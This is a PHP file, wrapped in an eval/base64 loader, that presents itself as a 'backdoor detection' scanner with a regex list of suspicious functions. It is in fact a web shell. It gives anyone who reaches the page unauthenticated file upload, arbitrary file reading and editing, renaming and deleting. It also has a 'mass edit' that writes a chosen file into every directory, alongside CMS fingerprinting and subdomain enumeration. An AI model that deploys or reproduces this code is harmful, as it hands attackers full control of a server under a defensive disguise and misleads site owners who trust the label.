<?=eval("?>".base64_decode("<?php
/**
 * TOMODACHI BACKDOOR DETECTION (Styled Version)
 * - Scan suspicious backdoor patterns (regex).
 * - Suspicious results: file name, path, detected regex pattern.
 * - Detect new files in last 7 days (upload/modify).
 * - File manager: upload, edit, rename, delete.
 * - Mass edit files: create/update file across directories.
 * - Show file permissions with color codes.
 * - Styled UI with CSS + background GIF.
 * - Added features: website info, CMS detection, server detection, file count, domain scanning
 */

$scanDir = __DIR__;
$maxFileSize = 5 * 1024 * 1024; // 5MB

$patterns = [
    '/eval\s*\(.*\)/i','/base64_decode\s*\(.*\)/i','/shell_exec\s*\(.*\)/i','/passthru\s*\(.*\)/i',
    '/exec\s*\(.*\)/i','/<form\s+enctype=["\']multipart\/form-data["\']\s+method=["\']POST["\'][^>]*>/i',
    '/curl_exec\s*\(.*\)/i','/file_put_contents\s*\(.*\)/i','/move_uploaded_file\s*\(.*\)/i','/\$__FILE__/',
    '/proc_open\s*\(.*\)/i','/popen\s*\(.*\)/i','/system\s*\(.*\)/i','/eval\s*\(\s*gzuncompress\s*\(.*\)\s*\)/i',
    '/include\s*\(.*\)/i','/require\s*\(.*\)/i','/eval\s*\(\s*base64_decode\s*\(.*\)\s*\)/i',
    '/eval\s*\(\s*htmlspecialchars_decode\s*\(.*\)\s*\)/i','/eval\s*\(\s*gzinflate\s*\(.*\)\s*\)/i',
    '/set_time_limit\s*\(.*\)/i','/header\s*\(\s*"X-XSS-Protection:\s*0"\s*\)/i','/pcntl_exec\s*\(.*\)/i',
    '/(?<![A-Za-z0-9_])__halt_compiler(?![A-Za-z0-9_])/','/assert\s*\(.*\)/i','/preg_replace\s*\(.+\/e.*\)/i',
    '/<\?php\s+echo\s+`.*`;/i','/fwrite\s*\(.*\)/i','/fopen\s*\(.*\)/i','/error_reporting\s*\(.*\)/i',
    '/chmod\s+[0-7]{3,4}/i','/chown\s+\w+:\w+/i','/0644/','/0755/','/4444/',
    '/<input[^>]*type=["\']file["\']/i','/<input[^>]*type=["\']button["\'].*value=["\']upload["\']/i',
    '/@ini_set\s*\(\s*["\']display_errors["\']\s*,\s*0\s*\)/i'
];

// CMS detection patterns
$cmsPatterns = [
    'WordPress' => '/wp-content|wp-includes|wp-admin|wp-config\.php|WordPress/i',
    'Laravel' => '/laravel|artisan|vendor\/laravel|Illuminate|\\\Illuminate/i',
    'Drupal' => '/drupal|sites\/all|sites\/default|misc\/drupal|Drupal::/i',
    'Joomla' => '/joomla|components\/com_|modules\/mod_|templates\/.*joomla|Joomla!/i',
    'PrestaShop' => '/prestashop|config\/settings\.inc\.php|classes\/Shop|PrestaShop/i',
    'WooCommerce' => '/woocommerce|wc-api|wc-order|WooCommerce/i',
    'Magento' => '/magento|app\/Mage\.php|Mage_|Magento\\\/i',
    'OpenCart' => '/opencart|system\/storage|catalog\/controller|OpenCart/i'
];

function scanSuspiciousFiles($dir, $patterns, $maxFileSize) {
    $rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));
    $results = [];
    foreach ($rii as $file) {
        if ($file->isDir()) continue;
        if ($file->getSize() > $maxFileSize) continue;
        $contents = @file_get_contents($file->getPathname());
        if ($contents === false) continue;
        foreach ($patterns as $pattern) {
            if (preg_match($pattern, $contents)) {
                $results[] = ['file' => $file->getPathname(),'pattern' => $pattern];
                break;
            }
        }
    }
    return $results;
}

function detectRecentFiles($dir, $days = 7) {
    $rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));
    $recent = [];
    $threshold = time() - ($days * 24 * 60 * 60);
    foreach ($rii as $file) {
        if ($file->isDir()) continue;
        if ($file->getMTime() >= $threshold) {
            $recent[] = [
                'file' => $file->getPathname(),
                'size' => $file->getSize(),
                'mtime' => date("Y-m-d H:i:s", $file->getMTime()),
                'perm' => substr(sprintf('%o', fileperms($file->getPathname())), -4)
            ];
        }
    }
    return $recent;
}

function listFiles($dir) {
    $rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));
    $files = [];
    foreach ($rii as $file) {
        if ($file->isDir()) continue;
        $files[] = $file->getPathname();
    }
    return $files;
}

function countFiles($dir) {
    $count = 0;
    $rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));
    foreach ($rii as $file) {
        if ($file->isFile()) {
            $count++;
        }
    }
    return $count;
}

function colorPerm($perm) {
    if ($perm === "0644") return "<span style='color:lime;font-weight:bold'>$perm</span>";
    if ($perm === "0755") return "<span style='color:yellow;font-weight:bold'>$perm</span>";
    if ($perm === "4444") return "<span style='color:red;font-weight:bold'>$perm</span>";
    return $perm;
}

function detectCMS($dir, $cmsPatterns) {
    $rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));
    $detectedCMS = [];
    
    foreach ($rii as $file) {
        if ($file->isDir()) continue;
        
        $filename = $file->getFilename();
        $path = $file->getPathname();
        
        // Check file content for CMS patterns
        $content = @file_get_contents($path);
        if ($content === false) continue;
        
        foreach ($cmsPatterns as $cms => $pattern) {
            if (preg_match($pattern, $content) || preg_match($pattern, $path) || preg_match($pattern, $filename)) {
                if (!in_array($cms, $detectedCMS)) {
                    $detectedCMS[] = $cms;
                }
            }
        }
        
        // Limit scanning for performance
        if (count($detectedCMS) >= 3) break;
    }
    
    return !empty($detectedCMS) ? implode(", ", $detectedCMS) : "UNKNOWN";
}

function getServerInfo() {
    $server = $_SERVER['SERVER_SOFTWARE'] ?? '';
    
    if (stripos($server, 'apache') !== false) {
        return 'Apache';
    } elseif (stripos($server, 'nginx') !== false) {
        return 'Nginx';
    } elseif (stripos($server, 'iis') !== false || stripos($server, 'microsoft') !== false) {
        return 'IIS (Windows)';
    } elseif (stripos($server, 'liteSpeed') !== false) {
        return 'LiteSpeed';
    } else {
        return $server ?: 'Tidak diketahui';
    }
}

function getCountryFromIP() {
    $ip = $_SERVER['REMOTE_ADDR'] ?? '';
    if (empty($ip)) return 'Tidak diketahui';
    
    try {
        $url = "http://ip-api.com/json/{$ip}";
        $response = @file_get_contents($url);
        
        if ($response === false) {
            return 'Tidak dapat mengakses layar IP geolocation';
        }
        
        $data = json_decode($response, true);
        
        if ($data && $data['status'] === 'success') {
            return $data['country'] . ' (' . $data['countryCode'] . ')';
        } else {
            return 'Tidak diketahui';
        }
    } catch (Exception $e) {
        return 'Error: ' . $e->getMessage();
    }
}

function scanSubdomains($domain) {
    // Common subdomains to check
    $commonSubdomains = [
        'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'ns2',
        'cpanel', 'whm', 'autodiscover', 'autoconfig', 'm', 'imap', 'test', 'blog',
        'dev', 'development', 'staging', 'api', 'admin', 'dashboard', 'secure', 'vpn',
        'mobile', 'shop', 'store', 'forum', 'support', 'help', 'webdisk', 'direct', 'direct-connect',
        'http', 'https'
    ];
    
    $foundSubdomains = [];
    
    foreach ($commonSubdomains as $subdomain) {
        $host = $subdomain . '.' . $domain;
        if (gethostbyname($host) != $host) {
            $foundSubdomains[] = $host;
        }
        
        // Also check with http and https prefixes
        $httpHost = 'http://' . $host;
        $httpsHost = 'https://' . $host;
        
        // Check if these URLs might resolve (simplified check)
        if ($subdomain === 'http' || $subdomain === 'https') {
            $foundSubdomains[] = $httpHost;
            $foundSubdomains[] = $httpsHost;
        }
    }
    
    return $foundSubdomains;
}

$action = $_GET['action'] ?? null;
$message = '';

if ($action === 'upload' && isset($_FILES['upload'])) {
    $dest = $scanDir . '/' . basename($_FILES['upload']['name']);
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest)) {
        $message = "File uploaded to $dest";
    } else {
        $message = "Upload failed.";
    }
}
if ($action === 'save_edit' && isset($_POST['filepath'], $_POST['content'])) {
    $fp = $_POST['filepath'];
    if (file_put_contents($fp, $_POST['content']) !== false) {
        $message = "File saved: $fp";
    } else {
        $message = "Failed to save file.";
    }
}
if ($action === 'rename' && isset($_POST['oldname'], $_POST['newname'])) {
    if (rename($_POST['oldname'], $_POST['newname'])) {
        $message = "File renamed.";
    } else {
        $message = "Rename failed.";
    }
}
if ($action === 'delete' && isset($_POST['filepath'])) {
    if (unlink($_POST['filepath'])) {
        $message = "File deleted.";
    } else {
        $message = "Delete failed.";
    }
}
if ($action === 'mass_edit' && isset($_POST['dirpath'], $_POST['filename'], $_POST['content'])) {
    $targetDir = $_POST['dirpath'];
    $rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($targetDir));
    $count = 0;
    foreach ($rii as $file) {
        if ($file->isDir()) {
            $newFile = $file->getPathname() . '/' . $_POST['filename'];
            if (file_put_contents($newFile, $_POST['content']) !== false) {
                $count++;
            }
        }
    }
    $message = "Mass edit created/updated {$_POST['filename']} in $count directories.";
}
if ($action === 'scan_domain' && isset($_POST['domain'])) {
    $domain = $_POST['domain'];
    $subdomains = scanSubdomains($domain);
    $message = "Domain scan completed for $domain";
}

// Get website information
$domain = $_SERVER['HTTP_HOST'] ?? 'localhost';
$country = getCountryFromIP();
$detectedCMS = detectCMS($scanDir, $cmsPatterns);
$currentDateTime = date("Y-m-d H:i:s");
$serverInfo = getServerInfo();
$fileCount = countFiles($scanDir);

$results = scanSuspiciousFiles($scanDir, $patterns, $maxFileSize);
$recentFiles = detectRecentFiles($scanDir, 7);
$allFiles = listFiles($scanDir);
?>
<!DOCTYPE html>
<html>
<head>
    <title>TOMODACHI BACKDOOR DETECTION</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: url('https://i.gifer.com/fyrS.gif') no-repeat center center fixed;
            background-size: cover;
            color: #fff;
            margin: 0;
            padding: 20px;
        }
        h1 { color: #ff4c4c; text-align:center; text-shadow:2px 2px 5px #000; }
        h2 { border-bottom:2px solid #ff4c4c; padding-bottom:5px; }
        h3 { color: #ffcc00; }
        .message { background:rgba(0,0,0,0.6); padding:10px; margin:15px 0; border-radius:8px; }
        table { border-collapse: collapse; width:100%; margin:15px 0; background:rgba(0,0,0,0.6); }
        th, td { border:1px solid #444; padding:8px; text-align:left; }
        th { background:#222; color:#ff4c4c; }
        tr:hover { background:rgba(255,255,255,0.1); }
        button { background:#ff4c4c; border:none; color:#fff; padding:5px 10px; border-radius:5px; cursor:pointer; }
        button:hover { background:#ff1c1c; }
        textarea { width:100%; height:300px; background:#111; color:#0f0; border:1px solid #444; padding:10px; }
        input[type=text], input[type=file] {
            padding:5px; width:100%; border:1px solid #444; background:#111; color:#fff;
        }
        .form-box { background:rgba(0,0,0,0.7); padding:15px; border-radius:8px; margin:15px 0; }
        .info-box { 
            background: rgba(0,0,0,0.7); 
            padding: 15px; 
            border-radius: 8px; 
            margin: 15px 0; 
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 15px;
        }
        .info-item {
            padding: 10px;
            background: rgba(50,50,50,0.5);
            border-radius: 5px;
        }
        .info-label {
            font-weight: bold;
            color: #ffcc00;
        }
        .scan-button {
            background: #4CAF50;
            padding: 10px 15px;
            font-size: 16px;
        }
        .scan-button:hover {
            background: #45a049;
        }
        .subdomain-list {
            max-height: 200px;
            overflow-y: auto;
            background: rgba(0,0,0,0.8);
            padding: 10px;
            border-radius: 5px;
            margin-top: 10px;
        }
    </style>
    <script>
        function confirmDelete() {
            return confirm("Yakin ingin menghapus file ini?");
        }
        
        function toggleSubdomains() {
            var subdomainsDiv = document.getElementById('subdomains-list');
            if (subdomainsDiv.style.display === 'none') {
                subdomainsDiv.style.display = 'block';
            } else {
                subdomainsDiv.style.display = 'none';
            }
        }
    </script>
</head>
<body>
    <h1>🚨 TOMODACHI BACKDOOR DETECTION 🚨</h1>
    
    <!-- Informasi Website -->
    <h2>Informasi Website</h2>
    <div class="info-box">
        <div class="info-item">
            <span class="info-label">Domain:</span> <?= htmlspecialchars($domain) ?>
        </div>
        <div class="info-item">
            <span class="info-label">Negara (Berdasarkan IP):</span> <?= htmlspecialchars($country) ?>
        </div>
        <div class="info-item">
            <span class="info-label">CMS Terdeteksi:</span> <?= htmlspecialchars($detectedCMS) ?>
        </div>
        <div class="info-item">
            <span class="info-label">Tanggal/Waktu:</span> <?= $currentDateTime ?>
        </div>
        <div class="info-item">
            <span class="info-label">Server:</span> <?= htmlspecialchars($serverInfo) ?>
        </div>
        <div class="info-item">
            <span class="info-label">Jumlah File:</span> <?= $fileCount ?>
        </div>
    </div>
    
    <?php if($message): ?><div class="message"><?=htmlspecialchars($message)?></div><?php endif; ?>
    
    <!-- Scan Domain -->
    <div class="form-box">
        <h2>Scan Domain/Subdomain</h2>
        <form method="post" action="?action=scan_domain">
            <label>Domain Target:<br>
                <input type="text" name="domain" value="<?= htmlspecialchars($domain) ?>" required>
            </label><br><br>
            <button type="submit" class="scan-button">Scan Domain</button>
        </form>
        
        <?php if ($action === 'scan_domain' && isset($subdomains)): ?>
            <div style="margin-top: 15px;">
                <h3>Hasil Scan Subdomain untuk <?= htmlspecialchars($domain) ?></h3>
                <?php if (!empty($subdomains)): ?>
                    <button onclick="toggleSubdomains()">Tampilkan/Sembunyikan Subdomain</button>
                    <div id="subdomains-list" class="subdomain-list" style="display: none;">
                        <ul>
                            <?php foreach ($subdomains as $sub): ?>
                                <li><?= htmlspecialchars($sub) ?></li>
                            <?php endforeach; ?>
                        </ul>
                    </div>
                <?php else: ?>
                    <p>Tidak ditemukan subdomain umum.</p>
                <?php endif; ?>
            </div>
        <?php endif; ?>
    </div>

    <h2>Hasil deteksi suspicious (urut by score)</h2>
    <table>
        <tr><th>File</th><th>Detected Pattern</th></tr>
        <?php foreach ($results as $r): ?>
            <tr>
                <td><?=htmlspecialchars($r['file'])?></td>
                <td><code><?=htmlspecialchars($r['pattern'])?></code></td>
            </tr>
        <?php endforeach; ?>
    </table>

    <h2>File baru / baru diupload (7 hari terakhir)</h2>
    <table>
        <tr><th>File</th><th>Size</th><th>Modified</th><th>Permissions</th><th>Actions</th></tr>
        <?php foreach ($recentFiles as $f): ?>
            <tr>
                <td><?=htmlspecialchars($f['file'])?></td>
                <td><?=$f['size']?></td>
                <td><?=$f['mtime']?></td>
                <td><?=colorPerm($f['perm'])?></td>
                <td>
                    <form method="get" action="" style="display:inline">
                        <input type="hidden" name="action" value="edit">
                        <input type="hidden" name="filepath" value="<?=htmlspecialchars($f['file'])?>">
                        <button type="submit">Edit</button>
                    </form>
                    <form method="post" action="?action=rename" style="display:inline">
                        <input type="hidden" name="oldname" value="<?=htmlspecialchars($f['file'])?>">
                        <input type="text" name="newname" placeholder="New name">
                        <button type="submit">Rename</button>
                    </form>
                    <form method="post" action="?action=delete" style="display:inline" onsubmit="return confirmDelete()">
                        <input type="hidden" name="filepath" value="<?=htmlspecialchars($f['file'])?>">
                        <button type="submit">Delete</button>
                    </form>
                </td>
            </tr>
        <?php endforeach; ?>
    </table>

    <div class="form-box">
        <h2>Upload File</h2>
        <form method="post" enctype="multipart/form-data" action="?action=upload">
            <input type="file" name="upload">
            <button type="submit">Upload</button>
        </form>
    </div>

    <?php if ($action === 'edit' && isset($_GET['filepath'])): 
        $content = @file_get_contents($_GET['filepath']); ?>
        <div class="form-box">
            <h2>Edit File: <?=htmlspecialchars($_GET['filepath'])?></h2>
            <form method="post" action="?action=save_edit">
                <input type="hidden" name="filepath" value="<?=htmlspecialchars($_GET['filepath'])?>">
                <textarea name="content"><?=htmlspecialchars($content)?></textarea>
                <button type="submit">Save</button>
            </form>
        </div>
    <?php endif; ?>

    <div class="form-box">
        <h2>Mass Edit Files</h2>
        <form method="post" action="?action=mass_edit">
            <label>Directory Path:<br><input type="text" name="dirpath" value="<?=$scanDir?>"></label><br><br>
            <label>File Name:<br><input type="text" name="filename" required></label><br><br>
            <label>Content:<br><textarea name="content" required></textarea></label><br>
            <button type="submit">Save to All Directories</button>
        </form>
    </div>
</body>
</html>"));?>
